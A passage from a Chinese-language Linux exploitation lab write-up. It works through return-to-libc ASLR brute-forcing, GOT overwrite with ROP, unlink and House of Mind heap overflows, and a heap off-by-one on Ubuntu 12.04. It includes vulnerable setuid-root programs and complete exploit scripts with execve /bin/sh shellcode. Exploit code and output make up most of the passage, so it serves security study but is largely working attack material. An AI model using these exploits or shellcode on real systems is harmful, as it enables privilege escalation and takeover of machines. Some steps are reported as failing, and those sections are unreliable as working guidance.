printf(“%s\n”,buf);  </p><p>\8.   fflush(stdout);  </p><p>\9.   <strong>return</strong> 0;  </p><p>\10. }  </p><p>编译命令：</p><p>\1.  #echo 2 &gt; /proc/sys/kernel/randomize_va_space  </p><p>\2.  $gcc -fno-stack-protector -g -o test test.c  </p><p>\3.  $sudo chown root test  </p><p>\4.  $sudo chgrp root test  </p><p>\5.  $sudo chmod +s test  </p><p>下面是（当随机化打开时）不同的 Libc 基址：</p><p><img src="file:///C:/Users/5454/AppData/Local/Temp/msohtmlclip1/01/clip_image027.png" alt="img"></p><p>上面展示了，Libc 随机化仅限于 8 位。因此我们可以在最多 256 次尝试内，得到 root shell。在下面的利用代码中，让我们选择0xb75b5000作为 Libc 基址，并让我们尝试几次。</p><p>首先我们先找到system()的偏移量:0x0003f0b0</p><p><img src="file:///C:/Users/5454/AppData/Local/Temp/msohtmlclip1/01/clip_image028.png" alt="img"></p><p>其次找到exit()的偏移量：0x0032bf0</p><p><img src="file:///C:/Users/5454/AppData/Local/Temp/msohtmlclip1/01/clip_image029.png" alt="img"></p><p>然后找到“/bin/sh”的地址：</p><p><img src="file:///C:/Users/5454/AppData/Local/Temp/msohtmlclip1/01/clip_image030.png" alt="img"></p><p>利用代码：</p><p>\1.  #exp.py  </p><p>\2.  #!/usr/bin/env python  </p><p>\3.  import <strong>struct</strong>  </p><p>\4.  from subprocess import call  </p><p>\5.    </p><p>\6.  libc_base_addr = 0xb75b5000  </p><p>\7.  exit_off = 0x0003f0b0             #Obtained from “readelf -s libc.so.6 | grep system” command.  </p><p>\8.  system_off = 0x00032bf0           #Obtained from “readelf -s libc.so.6 | grep exit” command.  </p><p>\9.  system_addr = libc_base_addr + system_off  </p><p>\10. exit_addr = libc_base_addr + exit_off  </p><p>\11. system_arg = 0xb76c06a0  </p><p>\12.   </p><p>\13. #endianess convertion  </p><p>\14. def conv(num):  </p><p>\15.  <strong>return</strong> <strong>struct</strong>.pack(“&lt;I”,num)  #system + exit + system_arg  </p><p>\16. buf = “A” * 268  </p><p>\17. buf += conv(system_addr)  </p><p>\18. buf += conv(exit_addr)  </p><p>\19. buf += conv(system_arg)  </p><p>\20.   </p><p>\21. print “Calling vulnerable program”  </p><p>\22. #Multiple tries until we get lucky  </p><p>\23. i = 0  </p><p>\24. <strong>while</strong> (i &lt; 256):  </p><p>\25.  print “Number of tries: %d” %i  </p><p>\26.  i += 1  </p><p>\27.  ret = call([“./test”, buf])  </p><p>\28.  <strong>if</strong> (not ret):  </p><p>\29.   <strong>break</strong>  </p><p>\30.  <strong>else</strong>:  </p><p>\31.   print “Exploit failed”  </p><p>运行上面的利用代码，我们会得到 root shell</p><p><img src="file:///C:/Users/5454/AppData/Local/Temp/msohtmlclip1/01/clip_image031.png" alt="img"></p><p><strong>Test 8**</strong>：绕过ASLR - 第三部分**</p><p>虚拟机安装：Ubuntu 12.04（x86）</p><p>让我们看看如何使用 GOT 覆盖和解引用技巧。来绕过共享库地址随机化。我们在第一部分中提到过，即使可执行文件没有所需的 PLT 桩代码，攻击者也可以使用 GOT 覆盖和解引用技巧来绕过 ASLR。</p><p>漏洞代码：</p><p>\1.  #include &lt;stdio.h&gt;  </p><p>\2.  #include &lt;string.h&gt;  </p><p>\3.  #include &lt;stdlib.h&gt;  </p><p>\4.    </p><p>\5.  <strong>int</strong> main (<strong>int</strong> argc, <strong>char</strong> **argv) {  </p><p>\6.   <strong>char</strong> buf[256];  </p><p>\7.   <strong>int</strong> i;  </p><p>\8.   seteuid(getuid());  </p><p>\9.   <strong>if</strong>(argc &lt; 2) {  </p><p>\10.   puts(“Need an argument\n”);  </p><p>\11.   exit(-1);  </p><p>\12.  }  </p><p>\13.  strcpy(buf, argv[1]);  </p><p>\14.  printf(“%s\nLen:%d\n”, buf, (<strong>int</strong>)strlen(buf));  </p><p>\15.  <strong>return</strong> 0;  </p><p>\16. }  </p><p>编译命令：</p><p>\1.  #echo 2 &gt; /proc/sys/kernel/randomize_va_space  </p><p>\2.  $gcc -fno-stack-protector -o test test.c  </p><p>\3.  $sudo chown root test  </p><p>\4.  $sudo chgrp root test  </p><p>\5.  $sudo chmod +s test  </p><p>我们发现system@PLT并没有在我们的可执行文件vuln中出现。字符串”sh”也没有在我们的可执行文件vuln中出现。</p><p>将特定 Libc 函数的 GOT 条目覆盖为另一个 Libc 函数的地址（在第一次调用之后）。但是它也可以覆盖为execve函数的地址 – 当偏移差加到GOT[getuid]的时候。我们已经知道了，在共享库中，函数距离其基址的偏移永远是固定的。所以，如果我们将两个 Libc 函数的差值（execve和getuid）加到getuid的 GOT 条目，我们就得到了execve函数的地址。之后，调用getuid就会调用execve。</p><p>ROP 是个技巧，其中攻击者一旦得到了调用栈的控制之后，他就可以执行精心构造的机器指令，来执行它所需的操作，即使没有直接的方式。例如，在 return-to-libc 攻击中，我们将返回地址覆盖为system的地址，来执行system。但是如果system（以及execve函数族）从 Libc 共享库中溢出了，攻击者就不能获得 root shell。这时，ROP 就可以拯救攻击者。在这个技巧中，即使任何所需的 Libc 函数都不存在，攻击者可以通过执行一系列的零件（gadget），来模拟所需的 Libc 函数。</p><p>Step 1：我们需要一个零件，它将偏移差加到GOT[getuid]上。所以让我们寻找一个add零件，它将结果复制到内存区域中。</p><p>Step 2：确保 EBX 包含getuid的 GOT 条目。getuid的 GOT 条目（在下面展示）位于0x804a004。因此 EBX 应该为0x804a004，但是由于add零件中，固定值0x5d5b04c4加到了 EBX，所以 EBX 应减去这个固定值，也就是ebx = 0x804a004 -0x5d5b04c4 = 0xaaa99b40。Step 3：现在我们需要寻找一个零件，它将这个值0xaaa99b40复制到 EBX 寄存器中。</p><p>确保 EAX 包含偏移差。因此我们需要找到一个零件，它将偏移差复制到 EAX 寄存器中。</p><p><strong>Test 9**</strong>：使用unlink堆溢出**</p><p>虚拟机安装：Ubuntu 12.04（x86）</p><p>使用 unlink 技巧成功利用堆溢出。</p><p>漏洞程序：</p><p>\1.  /*  </p><p>\2.   Heap overflow vulnerable program.  </p><p>\3.   */  </p><p>\4.  #include &lt;stdlib.h&gt;  </p><p>\5.  #include &lt;string.h&gt;  </p><p>\6.    </p><p>\7.  <strong>int</strong> main( <strong>int</strong> argc, <strong>char</strong> * argv[] )  </p><p>\8.  {  </p><p>\9.          <strong>char</strong> * first, * second;  </p><p>\10.   </p><p>\11. /<em>[1]</em>/ first = malloc( 666 );  </p><p>\12. /<em>[2]</em>/ second = malloc( 12 );  </p><p>\13.         <strong>if</strong>(argc!=1)  </p><p>\14. /<em>[3]</em>/         strcpy( first, argv[1] );  </p><p>\15. /<em>[4]</em>/ free( first );  </p><p>\16. /<em>[5]</em>/ free( second );  </p><p>\17. /<em>[6]</em>/ <strong>return</strong>( 0 );  </p><p>\18. }  </p><p>上面程序的行[3]会导致堆溢出。用户输入argv[1]复制给了堆缓冲区first，没有任何大小限制。因此，当用户输入大于 666 字节时，它就会覆盖下一个块的头部。这个溢出会导致任意代码执行。</p><p>unlink：这个技巧的核心思想，就是欺骗 glibc malloc 来 unlink 第二个块。unlink free的 GOT 条目会使其被 shellcode 地址覆盖。在成功覆盖之后，现在在行[5]，free被漏洞程序调用时，shellcode 就会执行。</p><p>首先我们了解一下glibc malloc</p><p>  ptmalloc2是从 dlmalloc分叉的。在fork之后，线程支持被添加到它并在2006年发布。在正式发布之后，ptmalloc2被集成到glibc源代码中。一旦集成，代码更改就直接转换为glibc malloc源代码本身。因此，ptmalloc2和glibc的malloc实现之间可能会有很多变化。曾经出现在这个岗位的malloc内部调用要么BRK或MMAP系统调用。由于ptmalloc2的线程支持，它成为了linux的默认内存分配器。线程支持有助于提高内存分配器性能，从而提高应用程序性能。在dlmalloc中，当两个线程同时调用malloc时，只有一个线程可以进入临界区，因为freelist数据结构在所有可用线程之间共享。因此，内存分配在多线程应用程序中需要时间，从而导致性能下降。在ptmalloc2中，当两个线程同时调用malloc时，会立即分配内存，因为每个线程都维护一个单独的堆段，因此维护这些堆的空列表数据结构也是分开的。每个线程竞技场。</p><p>多个竞技场时：</p><p>​      • 当主线程，第一次调用malloc 已经创建主竞技场时，没有任何争用。</p><p>​      • 当线程1和线程2第一次调用malloc时，会  为它们创建一个新的竞技场，并且它的使用没有任何争用。直到这一点，线程和竞技场都有一对一的映射。</p><p>​      • 当线程3第一次调用malloc时，计算竞技场限制的数量。这里竞技场限制被越过，因此尝试重用现有竞技场（主竞技场或竞技场1或竞技场2）</p><p>​      • 重用：</p><p>​           • 一旦环绕可用的竞技场，循环尝试锁定该竞技场。</p><p>​           • 如果成功锁定（让主竞技场成功锁定），请将该竞技场返回给用户。</p><p>​           • 如果没有发现任何竞技场，则  排在下一个竞技场。</p><p>​      • 现在当线程3调用malloc（第二次）时，malloc将尝试使用最后访问的竞技场（主竞技场）。如果主竞技场是免费的，则其使用的其他thread3将被阻止，直到主竞技场被释放。因此现在主要的竞技场在主线程和线程3之间共享。</p><p>利用程序：</p><p>\1.  /* Program to exploit ‘test’ using unlink technique. </p><p>\2.   */  </p><p>\3.  #include &lt;string.h&gt;  </p><p>\4.  #include &lt;unistd.h&gt;  </p><p>\5.    </p><p>\6.  #define FUNCTION_POINTER ( 0x0804978c )         //Address of GOT entry for free function obtained using “objdump -R vuln”.  </p><p>\7.  #define CODE_ADDRESS ( 0x0804a008 + 0x10 )      //Address of variable ‘first’ in vuln executable.   </p><p>\8.    </p><p>\9.  #define VULNERABLE “./vuln”  </p><p>\10. #define DUMMY 0xdefaced  </p><p>\11. #define PREV_INUSE 0x1  </p><p>\12.   </p><p>\13. <strong>char</strong> shellcode[] =  </p><p>\14.         /* Jump instruction to jump past 10 bytes. ppssssffff - Of which ffff would be overwritten by unlink function </p><p>\15.         (by statement BK-&gt;fd = FD). Hence if no jump exists shell code would get corrupted by unlink function.  </p><p>\16.         Therefore store the actual shellcode 12 bytes past the beginning of buffer ‘first’*/  </p><p>\17.         “\xeb\x0assppppffff”  </p><p>\18.         “\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80”;  </p><p>\19.   </p><p>\20. <strong>int</strong> main( <strong>void</strong> )  </p><p>\21. {  </p><p>\22.         <strong>char</strong> * p;  </p><p>\23.         <strong>char</strong> argv1[ 680 + 1 ];  </p><p>\24.         <strong>char</strong> * argv[] = { VULNERABLE, argv1, NULL };  </p><p>\25.   </p><p>\26.         p = argv1;  </p><p>\27.         /* the fd field of the first chunk */  </p><p>\28.         <em>( (*</em>void** <strong>)p ) = (</strong>void** *)( DUMMY );  </p><p>\29.         p += 4;  </p><p>\30.         /* the bk field of the first chunk */  </p><p>\31.         <em>( (*</em>void** <strong>)p ) = (</strong>void** *)( DUMMY );  </p><p>\32.         p += 4;  </p><p>\33.         /* the fd_nextsize field of the first chunk */  </p><p>\34.         <em>( (*</em>void** <strong>)p ) = (</strong>void** *)( DUMMY );  </p><p>\35.         p += 4;  </p><p>\36.         /* the bk_nextsize field of the first chunk */  </p><p>\37.         <em>( (*</em>void** <strong>)p ) = (</strong>void** *)( DUMMY );  </p><p>\38.         p += 4;  </p><p>\39.         /* Copy the shellcode */  </p><p>\40.         memcpy( p, shellcode, strlen(shellcode) );  </p><p>\41.         p += strlen( shellcode );  </p><p>\42.         /* Padding- 16 bytes for prev_size,size,fd and bk of second chunk. 16 bytes for fd,bk,fd_nextsize,bk_nextsize  </p><p>\43.         of first chunk */  </p><p>\44.         memset( p, ‘B’, (680 - 4<em>4) - (4</em>4 + strlen(shellcode)) );  </p><p>\45.         p += ( 680 - 4<em>4 ) - ( 4</em>4 + strlen(shellcode) );  </p><p>\46.         /* the prev_size field of the second chunk. Just make sure its an even number ie) its prev_inuse bit is unset */  </p><p>\47.         <em>( (*</em>size_t** <em>)p ) = (*</em>size_t**)( DUMMY &amp; ~PREV_INUSE );  </p><p>\48.         p += 4;  </p><p>\49.         /* the size field of the second chunk. By setting size to -4, we trick glibc malloc to unlink second chunk.*/  </p><p>\50.         <em>( (*</em>size_t** <em>)p ) = (*</em>size_t**)( -4 );  </p><p>\51.         p += 4;  </p><p>\52.         /* the fd field of the second chunk. It should point to free - 12. -12 is required since unlink function </p><p>\53.         would do + 12 (FD-&gt;bk). This helps to overwrite the GOT entry of free with the address we have overwritten in  </p><p>\54.         second chunk’s bk field (see below) */  </p><p>\55.         <em>( (*</em>void** <strong>)p ) = (</strong>void** *)( FUNCTION_POINTER - 12 );  </p><p>\56.         p += 4;  </p><p>\57.         /* the bk field of the second chunk. It should point to shell code address.*/  </p><p>\58.         <em>( (*</em>void** <strong>)p ) = (</strong>void** *)( CODE_ADDRESS );  </p><p>\59.         p += 4;  </p><p>\60.         /* the terminating NUL character */  </p><p>\61.         *p = ‘’;  </p><p>\62.   </p><p>\63.         /* the execution of the vulnerable program */  </p><p>\64.         execve( argv[0], argv, NULL );  </p><p>\65.         <strong>return</strong>( -1 );  </p><p>\66. }  </p><p>执行上述程序会派生新的 shell</p><p>\1.  szt@ubuntu:~/linux exploit/test9$ $ gcc -g -z norelro -z execstack -o test test.c -Wl,–rpath=/home/szt/glibc/glibc-inst2.20/lib -Wl,–dynamic-linker=/home/szt/glibc/glibc-inst2.20/lib/ld-linux.so.  </p><p>\2.  szt@ubuntu:~/linux exploit/test9$ gcc -g -o exp exp.c  </p><p>\3.  szt@ubuntu:~/linux exploit/test9$ ./exp   </p><p>\4.  szt@ubuntu:~/linux exploit/test9$ ls  </p><p>\5.  exp.c  exp.c~  test  test.c  </p><p>但是运行并不成功，后来查询资料。发现是已经加强了防护。使得这种更难攻击成功。</p><p><strong>Test 10**</strong>：使用 Malloc Maleficarum 的堆溢出**</p><p>虚拟机：Ubuntu 12.04（x86）</p><p>glibc malloc 变得更可靠了。之后，类似 unlink 的技巧已经废弃，攻击者没有线索。但是在 2005 年末，Phantasmal Phatasmagoria 带来了下面这些技巧，用于成功利用堆溢出。</p><p>• House of Prime</p><p>• House of Mind</p><p>• House of Force</p><p>• House of Lore</p><p>• House of Spirit</p><p><strong>House of Mind</strong></p><p>这个技巧中，攻击者欺骗 glibc malloc 来使用由他伪造的 arena。伪造的 arena 以这种形式构造，unsorted bin 的 fd 包含free的 GOT 条目地址 -12。因此现在当漏洞程序释放某个块的时候，free的 GOT 条目被覆盖为 shellcode 的地址。在成功覆盖 GOT 之后，当漏洞程序调用free，shellcode 就会执行。</p><p>这个需要先决条件：</p><p>• 在块的地址之前，需要一系列 malloc 调用 – 当对齐到内存区域中HEAP_MAX_SIZE结果的倍数的时候，内存区域由攻击者控制。这是伪造的heap_info结构所在的内存区域。伪造的heap_info的 arena 指针ar_ptr会指向伪造的 arena。因此伪造的 arena 和伪造的heap_info的内存区域都能由攻击者控制。</p><p>• 一个块，它的大小字段（以及它的 arena 指针 – 预备条件 1）由攻击者控制，应该已释放。</p><p>• 上述空闲块的下一个块应该不是 top 块。</p><p>漏洞程序：</p><p>\1.  /* test.c </p><p>\2.   House of Mind vulnerable program </p><p>\3.   */  </p><p>\4.  #include &lt;stdio.h&gt;  </p><p>\5.  #include &lt;stdlib.h&gt;  </p><p>\6.    </p><p>\7.  <strong>int</strong> main (<strong>void</strong>) {  </p><p>\8.   <strong>char</strong> <em>ptr = malloc(1024); /</em> First allocated chunk */  </p><p>\9.   <strong>char</strong> <em>ptr2; /</em> Second chunk/Last but one chunk */  </p><p>\10.  <strong>char</strong> <em>ptr3; /</em> Last chunk */  </p><p>\11.  <strong>int</strong> heap = (<strong>int</strong>)ptr &amp; 0xFFF00000;  </p><p>\12.  _Bool found = 0;  </p><p>\13.  <strong>int</strong> i = 2;  </p><p>\14.   </p><p>\15.  <strong>for</strong> (i = 2; i &lt; 1024; i++) {  </p><p>\16.    /* Prereq 1: Series of malloc calls until a chunk’s address - when aligned to HEAP_MAX_SIZE results in 0x08100000 */  </p><p>\17.    /* 0x08100000 is the place where fake heap_info structure is found. */  </p><p>\18.    [1]<strong>if</strong> (!found &amp;&amp; (((<strong>int</strong>)(ptr2 = malloc(1024)) &amp; 0xFFF00000) == \  </p><p>\19.       (heap + 0x100000))) {  </p><p>\20.      printf(“good heap allignment found on malloc() %i (%p)\n”, i, ptr2);  </p><p>\21.      found = 1;  </p><p>\22.      <strong>break</strong>;  </p><p>\23.    }  </p><p>\24.  }  </p><p>\25.  [2]ptr3 = malloc(1024); /* Last chunk. Prereq 3: Next chunk to ptr2 != av-&gt;top */  </p><p>\26.  /* User Input. */  </p><p>\27.  [3]fread (ptr, 1024 * 1024, 1, stdin);  </p><p>\28.   </p><p>\29.  [4]free(ptr2); /* Prereq 2: Freeing a chunk whose size and its arena pointer is controlled by the attacker. */  </p><p>\30.  [5]free(ptr3); /* Shell code execution. */  </p><p>\31.  <strong>return</strong>(0); /* Bye */  </p><p>\32. }  </p><p>漏洞程序的行[3]是堆溢出发生的地方。用户输入储存在块 1 的mem指针处，大小共计 1MB。所以为了成功利用堆溢出，攻击者提供了下面的用户输入。</p><p>利用程序：</p><p>\1.  /* exp.c </p><p>\2.  Program to generate attacker data. </p><p>\3.  Command: </p><p>\4.       #./exp &gt; file </p><p>\5.  */  </p><p>\6.  #include &lt;stdio.h&gt;  </p><p>\7.    </p><p>\8.  #define BIN1 0xb7fd8430  </p><p>\9.    </p><p>\10. <strong>char</strong> scode[] =  </p><p>\11. /* Shellcode to execute linux command “id”. Size - 72 bytes. */  </p><p>\12. “\x31\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e”  </p><p>\13. “\xc9\x6a\x42\x83\xeb\xfc\xe2\xf4\x34\xc2\x32\xdb\x0c\xaf\x02\x6f”  </p><p>\14. “\x3d\x40\x8d\x2a\x71\xba\x02\x42\x36\xe6\x08\x2b\x30\x40\x89\x10”  </p><p>\15. “\xb6\xc5\x6a\x42\x5e\xe6\x1f\x31\x2c\xe6\x08\x2b\x30\xe6\x03\x26”  </p><p>\16. “\x5e\x9e\x39\xcb\xbf\x04\xea\x42”;  </p><p>\17.   </p><p>\18. <strong>char</strong> ret_str[4] = “\x00\x00\x00\x00”;  </p><p>\19.   </p><p>\20. <strong>void</strong> convert_endianess(<strong>int</strong> arg)  </p><p>\21. {  </p><p>\22.         <strong>int</strong> i=0;  </p><p>\23.         ret_str[3] = (arg &amp; 0xFF000000) &gt;&gt; 24;  </p><p>\24.         ret_str[2] = (arg &amp; 0x00FF0000) &gt;&gt; 16;  </p><p>\25.         ret_str[1] = (arg &amp; 0x0000FF00) &gt;&gt; 8;  </p><p>\26.         ret_str[0] = (arg &amp; 0x000000FF) &gt;&gt; 0;  </p><p>\27. }  </p><p>\28. <strong>int</strong> main() {  </p><p>\29.         <strong>int</strong> i=0,j=0;  </p><p>\30.   </p><p>\31.         fwrite(“\x41\x41\x41\x41”, 4, 1, stdout); /* fd */  </p><p>\32.         fwrite(“\x41\x41\x41\x41”, 4, 1, stdout); /* bk */  </p><p>\33.         fwrite(“\x41\x41\x41\x41”, 4, 1, stdout); /* fd_nextsize */  </p><p>\34.         fwrite(“\x41\x41\x41\x41”, 4, 1, stdout); /* bk_nextsize */  </p><p>\35.         /* Fake Arena. */  </p><p>\36.         fwrite(“\x00\x00\x00\x00”, 4, 1, stdout); /* mutex */  </p><p>\37.         fwrite(“\x01\x00\x00\x00”, 4, 1, stdout); /* flag */  </p><p>\38.         <strong>for</strong>(i=0;i&lt;10;i++)  </p><p>\39.                 fwrite(“\x00\x00\x00\x00”, 4, 1, stdout); /* fastbinsY */  </p><p>\40.         fwrite(“\xb0\x0e\x10\x08”, 4, 1, stdout); /* top */  </p><p>\41.         fwrite(“\x00\x00\x00\x00”, 4, 1, stdout); /* last_remainder */  </p><p>\42.         <strong>for</strong>(i=0;i&lt;127;i++) {  </p><p>\43.                 convert_endianess(BIN1+(i*8));  </p><p>\44.                 <strong>if</strong>(i == 119) {  </p><p>\45.                         fwrite(“\x00\x00\x00\x00”, 4, 1, stdout); /* preserve prev_size */  </p><p>\46.                         fwrite(“\x09\x04\x00\x00”, 4, 1, stdout); /* preserve size */  </p><p>\47.                 } <strong>else</strong> <strong>if</strong>(i==0) {  </p><p>\48.                         fwrite(“\xe8\x98\x04\x08”, 4, 1, stdout); /* bins[i][0] = (GOT(free) - 12) */  </p><p>\49.                         fwrite(ret_str, 4, 1, stdout); /* bins[i][1] */  </p><p>\50.                 }  </p><p>\51.                 <strong>else</strong> {  </p><p>\52.                         fwrite(ret_str, 4, 1, stdout); /* bins[i][0] */  </p><p>\53.                         fwrite(ret_str, 4, 1, stdout); /* bins[i][1] */  </p><p>\54.                 }  </p><p>\55.         }  </p><p>\56.         <strong>for</strong>(i=0;i&lt;4;i++) {  </p><p>\57.                 fwrite(“\x00\x00\x00\x00”, 4, 1, stdout); /* binmap[i] */  </p><p>\58.         }  </p><p>\59.         fwrite(“\x00\x84\xfd\xb7”, 4, 1, stdout); /* next */  </p><p>\60.         fwrite(“\x00\x00\x00\x00”, 4, 1, stdout); /* next_free */  </p><p>\61.         fwrite(“\x00\x60\x0c\x00”, 4, 1, stdout); /* system_mem */  </p><p>\62.         fwrite(“\x00\x60\x0c\x00”, 4, 1, stdout); /* max_system_mem */  </p><p>\63.         <strong>for</strong>(i=0;i&lt;234;i++) {  </p><p>\64.                 fwrite(“\x41\x41\x41\x41”, 4, 1, stdout); /* PAD */  </p><p>\65.         }  </p><p>\66.         <strong>for</strong>(i=0;i&lt;722;i++) {  </p><p>\67.                 <strong>if</strong>(i==721) {  </p><p>\68.                         /* Chunk 724 contains the shellcode. */  </p><p>\69.                         fwrite(“\xeb\x18\x00\x00”, 4, 1, stdout); /* prev_size  - Jmp 24 bytes */  </p><p>\70.                         fwrite(“\x0d\x04\x00\x00”, 4, 1, stdout); /* size */  </p><p>\71.                         fwrite(“\x00\x00\x00\x00”, 4, 1, stdout); /* fd */  </p><p>\72.                         fwrite(“\x00\x00\x00\x00”, 4, 1, stdout); /* bk */  </p><p>\73.                         fwrite(“\x00\x00\x00\x00”, 4, 1, stdout); /* fd_nextsize */  </p><p>\74.                         fwrite(“\x00\x00\x00\x00”, 4, 1, stdout); /* bk_nextsize */  </p><p>\75.                         fwrite(“\x90\x90\x90\x90\x90\x90\x90\x90” \  </p><p>\76.                         “\x90\x90\x90\x90\x90\x90\x90\x90”, 16, 1, stdout);  /* NOPS */  </p><p>\77.                         fwrite(scode, <strong>sizeof</strong>(scode)-1, 1, stdout); /* SHELLCODE */  </p><p>\78.                         <strong>for</strong>(j=0;j&lt;230;j++)  </p><p>\79.                                 fwrite(“\x42\x42\x42\x42”, 4, 1, stdout); /* PAD */  </p><p>\80.                         <strong>continue</strong>;  </p><p>\81.                 } <strong>else</strong> {  </p><p>\82.                         fwrite(“\x00\x00\x00\x00”, 4, 1, stdout); /* prev_size */  </p><p>\83.                         fwrite(“\x09\x04\x00\x00”, 4, 1, stdout); /* size */  </p><p>\84.                 }  </p><p>\85.                 <strong>if</strong>(i==720) {  </p><p>\86.                         <strong>for</strong>(j=0;j&lt;90;j++)  </p><p>\87.                                 fwrite(“\x42\x42\x42\x42”, 4, 1, stdout); /* PAD */  </p><p>\88.                         fwrite(“\x18\xa0\x04\x08”, 4, 1, stdout); /* Arena Pointer */  </p><p>\89.                         <strong>for</strong>(j=0;j&lt;165;j++)  </p><p>\90.                                 fwrite(“\x42\x42\x42\x42”, 4, 1, stdout); /* PAD */  </p><p>\91.                 } <strong>else</strong> {  </p><p>\92.                         <strong>for</strong>(j=0;j&lt;256;j++)  </p><p>\93.                                 fwrite(“\x42\x42\x42\x42”, 4, 1, stdout); /* PAD */  </p><p>\94.                 }  </p><p>\95.         }  </p><p>\96.         <strong>return</strong> 0;  </p><p>\97. }  </p><p>在攻击者生成数据作为用户输入之后，glibc malloc 执行下列事情，当漏洞程序的行[4]执行时：</p><p>   Step 1：正在释放的堆的 arena 由访问arena_for_chunk获取。</p><p>   Step 2：使用 arena 指针和块地址作为参数调用_int_free。我们这里，arena 指针指向了伪造的 arena。因此伪造的 arena 和块地址作为参数传递给了_int_free。</p><p>   Step 3：如果块不是 mmap 分配的，要获取锁。我们这里块不是 mmap 分配的，伪造的 arena 的互斥锁获取成功。</p><p>   Step 4：合并： 查看上一个块是否空闲，如果空闲则合并。我们这里上一个块已分配，所以不能向后合并。查看下一个块是否空闲，如果空闲则合并。我们这里下一个块已分配，所以不能合并。</p><p>   Step 5：将当前空闲块放进 unsorted bin 中。</p><p>使用攻击者生成的数据文件，作为用户输入执行漏洞程序会执行 shellcode，像这样：</p><p>\1.  szt@ubuntu:~/linux exploit/test10$ $gcc -g -z norelro -z execstack -o test test.c -Wl,–rpath=/home/szt/glibc/glibc-inst2.20/lib -Wl,–dynamic-linker=/home/szt/glibc/glibc-inst2.20/lib/ld-linux.so.2  </p><p>\2.  szt@ubuntu:~/linux exploit/test10$ gcc -g -o exp exp.c  </p><p>\3.  szt@ubuntu:~/linux exploit/test10$ ./exp &gt; file  </p><p>\4.  szt@ubuntu:~/linux exploit/test10$ ./test &lt; file  </p><p>\5.  ptr found at 0x8048380  </p><p>\6.  good heap allignment found on malloc() 724 (0x80483a0)  </p><p><strong>Test 11**</strong>：Off-By-One 漏洞（基于堆）**</p><p>虚拟机安装：Ubuntu 12.04（x86）</p><p>将源字符串复制到目标缓冲区可能造成 Off-By-One 漏洞，当源字符串的长度等于目标缓冲区长度的时候。当源字符串的长度等于目标缓冲区长度的时候，单个 NULL 字符会复制到目标缓冲区的上方。因此由于目标缓冲区位于堆上，单个 NULL 字节会覆盖下一个块的块头部，并且这会导致任意代码执行。</p><p>漏洞代码：</p><p>\1.  //consolidate_forward.c  </p><p>\2.  #include &lt;stdio.h&gt;  </p><p>\3.  #include &lt;string.h&gt;  </p><p>\4.  #include &lt;stdlib.h&gt;  </p><p>\5.  #include &lt;unistd.h&gt;  </p><p>\6.  #include &lt;sys/types.h&gt;  </p><p>\7.  #include &lt;sys/stat.h&gt;  </p><p>\8.  #include &lt;fcntl.h&gt;  </p><p>\9.    </p><p>\10. #define SIZE 16  </p><p>\11.   </p><p>\12. <strong>int</strong> main(<strong>int</strong> argc, <strong>char*</strong> argv[])  </p><p>\13. {  </p><p>\14.   </p><p>\15.  <strong>int</strong> fd = open(“./inp_file”, O_RDONLY); /* [1] */  </p><p>\16.  <strong>if</strong>(fd == -1) {  </p><p>\17.  printf(“File open error\n”);  </p><p>\18.  fflush(stdout);  </p><p>\19.  exit(-1);  </p><p>\20.  }  </p><p>\21.   </p><p>\22.  <strong>if</strong>(strlen(argv[1])&gt;1020) { /* [2] */  </p><p>\23.  printf(“Buffer Overflow Attempt. Exiting…\n”);  </p><p>\24.  exit(-2);  </p><p>\25.  }  </p><p>\26.   </p><p>\27.  <strong>char*</strong> tmp = malloc(20-4); /* [3] */  </p><p>\28.  <strong>char*</strong> p = malloc(1024-4); /* [4] */  </p><p>\29.  <strong>char*</strong> p2 = malloc(1024-4); /* [5] */  </p><p>\30.  <strong>char*</strong> p3 = malloc(1024-4); /* [6] */  </p><p>\31.   </p><p>\32.  read(fd,tmp,SIZE); /* [7] */  </p><p>\33.  strcpy(p2,argv[1]); /* [8] */  </p><p>\34.   </p><p>\35.  free(p); /* [9] */  </p><p>\36. }  </p><p>编译命令：</p><p>\1.  #echo 0 &gt; /proc/sys/kernel/randomize_va_space  </p><p>\2.  $gcc -o consolidate_forward consolidate_forward.c  </p><p>\3.  $sudo chown root consolidate_forward  </p><p>\4.  $sudo chgrp root consolidate_forward  </p><p>\5.  $sudo chmod +s consolidate_forward  </p><p>上述漏洞代码的行[2]和[8]是基于堆的 off-by-one 溢出发生的地方。目标缓冲区的长度是 1020，因此长度为 1020 的源字符串可能导致任意代码执行。</p><p>unlink 一个已经处于分配状态的块，会导致任意代码执行，因为任何四个字节的内存区域都能被攻击者的数据覆盖。但是在同一篇文章中，我们也看到，unlink 技巧已经废弃，因为 glibc 近几年来变得更加可靠。具体来说，因为“双向链表损坏”的条件，任意代码执行时不可能的。但是，Google 的 Project Zero 小组找到了一种方式，来成功绕过“双向链表损坏”的条件，通过 unlink large 块。</p><p>在 glibc malloc 中，主要的环形双向链表由malloc_chunk的fd和bk字段维护，而次要的环形双向链表由malloc_chunk的fd_nextsize和bk_nextsize字段维护。双向链表的加固看起来用在主要（行[1]）和次要（行[4]和[5]）的双向链表上，但是次要的环形双向链表的加固，只是个调试断言语句（不像主要双向链表加固那样，是运行时检查），它在生产构建中没有被编译（至少在 fedora x86 中）。因此，次要的环形双向链表的加固（行[4]和[5]）并不重要，这让我们能够向任意 4 个字节的内存区域写入任何数据。所以现在攻击者需要覆盖要被释放的 large 块的malloc_chunk元素。</p><p>利用代码：</p><p>\1.  #exp_try.py  </p><p>\2.  #!/usr/bin/env python  </p><p>\3.  import <strong>struct</strong>  </p><p>\4.  from subprocess import call  </p><p>\5.    </p><p>\6.  fd = 0xb7ff9712  </p><p>\7.  bk = 0xb7f861b4  </p><p>\8.  fd_nextsize = 0xb7f86157  </p><p>\9.  bk_nextsize = 0x804b430  </p><p>\10. system = 0xb7e5d0b0  </p><p>\11. sh = 0xb7f816a0  </p><p>\12.   </p><p>\13. #endianess convertion  </p><p>\14. def conv(num):  </p><p>\15.  <strong>return</strong> <strong>struct</strong>.pack(“&lt;I”,num)  </p><p>\16. buf = conv(fd)  </p><p>\17. buf += conv(bk)  </p><p>\18. buf += conv(fd_nextsize)  </p><p>\19. buf += conv(bk_nextsize)  </p><p>\20. buf += conv(system)  </p><p>\21. buf += conv(sh)  </p><p>\22. buf += “A” * 996  </p><p>\23.   </p><p>\24. print “Calling vulnerable program”  </p><p>\25. call([“./consolidate_forward”, buf])  </p><p><img 